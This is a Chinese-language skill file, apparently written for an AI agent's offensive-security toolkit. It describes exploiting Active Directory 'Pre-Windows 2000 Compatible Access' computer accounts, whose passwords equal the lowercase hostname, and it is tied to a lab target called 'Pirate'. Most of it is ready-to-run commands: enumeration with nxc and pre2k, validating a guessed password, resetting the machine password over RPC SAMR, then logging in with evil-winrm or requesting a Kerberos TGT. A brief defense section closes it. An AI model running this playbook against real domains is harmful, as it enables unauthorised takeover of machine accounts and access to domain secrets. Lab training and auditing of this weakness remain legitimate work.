---
name: 'pre2k-attack'
description: 'Pre-Windows 2000 Compatible Access 攻击：枚举、密码公式、利用步骤、工具。Pirate靶机关键初始访问技术。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## Pre-Windows 2000 Compatible Access 攻击

### 原理
AD 中存在 "Pre-Windows 2000 Compatible Access" 内置组。当计算机账户被标记为 pre2k 兼容时，其密码 = **小写主机名截断到 14 字符**。这个设置在现代 Windows Server（包括 2022）中仍然存在。

### 枚举
```bash
# 方法1: nxc (需要有效域凭据)
nxc ldap <DC_IP> -u <user> -p <pass> -M pre2k

# 方法2: pre2k 工具 (支持认证和无认证模式)
git clone https://github.com/garrettfoster13/pre2k.git && cd pre2k && pipx install .
pre2k auth -u <user> -p <pass> -dc-ip <DC_IP> -d <domain>
pre2k unauth -dc-ip <DC_IP> -d <domain>

# 方法3: 手动识别 UAC 4128
# userAccountControl = 4128 (WORKSTATION_TRUST_ACCOUNT + 特定 flag)
```

### 利用
```bash
# 1. 验证密码（通常返回 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT）
nxc smb <DC> -u '<COMPUTER>$' -p '<lowercase_name>'

# 2. 修改密码（使用 RPC SAMR）
impacket-changepasswd <domain>/'<COMPUTER>$'@<DC_IP> -newpass 'NewPass123!' -p rpc-samr

# 3. 用新密码连接
evil-winrm -i <DC_IP> -u '<COMPUTER>$' -p 'NewPass123!'
# 或获取 TGT
impacket-getTGT <domain>/'<COMPUTER>$':'NewPass123!' -dc-ip <DC_IP>
```

### 为什么危险
- pre2k 账户通常是 "Pre-Windows 2000 Compatible Access" 组成员 → 拥有对域对象的扩展读取权限
- 可以直接读 gMSA 密码、枚举所有用户/组
- 密码公式是**确定性的**，不需要爆破

### 工具
- `pre2k` (garrettfoster13/pre2k)
- `nxc ldap -M pre2k`
- `impacket-changepasswd` (用 `-p rpc-samr`)

### 防御
- 审计 AD 中 userAccountControl=4128 的计算机账户
- 移除不需要的 pre2k 兼容性标记
- 从 Pre-Windows 2000 Compatible Access 组中移除不必要成员
